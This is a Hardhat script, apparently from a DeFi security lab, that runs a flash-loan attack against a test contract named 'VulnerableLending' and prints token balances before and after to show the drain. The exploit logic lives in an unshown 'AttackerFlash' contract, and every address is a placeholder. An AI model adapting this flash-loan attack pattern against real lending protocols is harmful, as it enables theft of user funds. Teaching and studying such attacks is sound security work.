const hre = require("hardhat");

async function main() {
  const [deployer, attackerEOA] = await hre.ethers.getSigners();

  const FLASH = "<REPLACE>";
  const ATTACK = "<REPLACE>"; 
  const TOKENA = "<REPLACE>";
  const TOKENB = "<REPLACE>";
  const LENDING = "<REPLACE>";

  const flash = await hre.ethers.getContractAt("FlashLoanProvider", FLASH);
  const attacker = await hre.ethers.getContractAt("AttackerFlash", ATTACK);
  const tokenA = await hre.ethers.getContractAt("TokenA", TOKENA);
  const tokenB = await hre.ethers.getContractAt("TokenB", TOKENB);
  const lending = await hre.ethers.getContractAt("VulnerableLending", LENDING);

  const flashAmount = hre.ethers.utils.parseEther("800");

  console.log("\n=== BEFORE ===");
  console.log("Lending TokenB:", hre.ethers.utils.formatEther(await tokenB.balanceOf(LENDING)));
  console.log("Attacker TokenB:", hre.ethers.utils.formatEther(await tokenB.balanceOf(attackerEOA.address)));

  const owed = flashAmount.mul(10005).div(10000); // 0.05% fee

  const collateralPlusRepay = owed.add(hre.ethers.utils.parseEther("100"));
  await tokenA.transfer(ATTACK, collateralPlusRepay);

  await attacker.connect(deployer).depositCollateral(hre.ethers.utils.parseEther("100"));

  console.log("Collateral deposited.");

  console.log("\nRunning flash loan attack...");
  await flash.flashLoan(ATTACK, flashAmount);

  console.log("\n=== AFTER ===");
  console.log("Lending TokenB:", hre.ethers.utils.formatEther(await tokenB.balanceOf(LENDING)));
  console.log("Attacker TokenB:", hre.ethers.utils.formatEther(await tokenB.balanceOf(attackerEOA.address)));
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
